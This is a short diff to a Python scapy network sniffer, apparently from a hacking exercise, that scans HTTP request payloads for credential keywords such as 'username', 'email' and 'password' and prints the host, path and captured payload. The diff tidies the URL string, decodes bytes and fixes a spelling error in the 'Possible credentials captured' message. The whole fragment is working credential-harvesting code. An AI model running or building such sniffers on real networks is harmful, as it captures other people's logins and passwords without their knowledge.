@@ -19,11 +19,11 @@ def process_sniff_packet(packet):
         if packet.haslayer(scapy.Raw):
             payload = packet[scapy.Raw].load
             keywords = ['username', 'uname', 'uid', 'user', 'email', 'mail', 'userid', 'id', 'login', 'password', 'pass']
+            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
             for word in keywords:
                 if word.encode() in payload:  # word.encode() to turn the string into bytes #Req!
-                    print('[+] HTTP Request >> ',
-                          str(packet[http.HTTPRequest].Host), str(packet[http.HTTPRequest].Path), sep='')
-                    print('[+] Possible credentials capured :', payload, end='\n')
+                    print('[+] HTTP Request >> ' + url.decode())
+                    print('[+] Possible credentials captured :', payload.decode(), end='\n')
                     break
 
 
